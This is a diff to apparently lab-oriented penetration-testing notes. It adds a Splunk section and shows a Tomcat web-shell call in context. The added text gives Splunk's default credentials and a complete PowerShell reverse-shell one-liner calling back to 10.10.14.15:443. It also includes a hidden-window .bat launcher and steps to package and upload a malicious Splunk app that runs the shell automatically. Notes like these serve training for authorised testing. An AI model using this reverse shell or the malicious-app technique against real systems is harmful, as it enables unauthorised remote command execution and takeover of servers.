@@ -9,6 +9,8 @@
 - [Tomcat](#tomcat)
     - [Enumeration](#enumeration-2)
     - [WAR File Upload](#war-file-upload)
+- [Splunk](#splunk)
+    - [Abusing Built-In Functionality](#abusing-built-in-functionality)
 
 ## Joomla
 ### Enumeration
@@ -294,3 +296,51 @@ abdeonix@htb[/htb]$ zip -r backup.war cmd.jsp
 ```bash
 curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 ```
+
+## Splunk 
+- Splunk is a log analytics tool used to gather, analyze and visualize data. 
+- Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics.
+- The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`
+
+### Abusing Built-In Functionality
+- We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The bin directory in this repo has examples for Python and PowerShell. Let's walk through this step-by-step.
+
+- The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner.
+```powershell
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+- The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.
+- We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
+
+```cmd
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+```
+- Once the files are created, we can create a tarball or `.spl` file.
+```bash
+abdeonix@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
+
+splunk_shell/
+splunk_shell/bin/
+splunk_shell/bin/rev.py
+splunk_shell/bin/run.bat
+splunk_shell/bin/run.ps1
+splunk_shell/default/
+splunk_shell/default/inputs.conf
+
+```
+- The next step is to choose `Install app from file` and upload the application.
+![Install_app](/images/install_app.png)
+- Before uploading the malicious custom app, let's start a listener using Netcat or socat.
+
+- On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.
+![Upload_app](/images/upload_app.png)
+- As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to Enabled.
+
+> ![NOTE]
+> If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
+
